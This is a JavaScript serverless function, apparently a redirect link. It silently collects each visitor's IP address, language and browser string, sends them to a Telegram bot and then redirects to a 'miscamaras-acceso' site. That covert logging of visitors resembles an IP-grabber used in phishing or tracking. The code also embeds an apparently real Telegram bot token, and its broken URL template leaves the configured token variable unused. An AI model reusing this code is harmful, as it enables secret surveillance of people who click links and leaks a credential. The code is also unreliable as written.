

export default async function handler(req, res) {
  try {
    const BOT_TOKEN = process.env.TG_TOKEN;
    const CHAT_ID = process.env.TG_ID;

    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket?.remoteAddress ||
      "unknown";

    const lang = req.headers["accept-language"] || "unknown";
    const ua = req.headers["user-agent"] || "unknown";

    const message = `
    Acceso
🕒 ${new Date().toISOString()}
🌐 IP: ${ip}
🗣 Lang: ${lang}
💻 UA: ${ua}
    `;

    // 🔒 Enviar mensaje (no bloquea el redirect)
    await fetch(`https://api.telegram.org/bot$BO8531232652:AAGJ_mqVbE4o8YwXF1hcBCJ_PXLP-9xdscw/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });

    res.writeHead(302, {
      Location: "https://miscamaras-acceso.vercel.app",
      "Cache-Control": "no-store"
    });
    res.end();

  } catch (err) {
    console.error("ENTER ERROR:", err);

    // ⚠️ Aunque falle Telegram, redirigimos igual
    res.writeHead(302, {
      Location: "https://miscamaras-acceso.vercel.app"
    });
    res.end();
  }
}
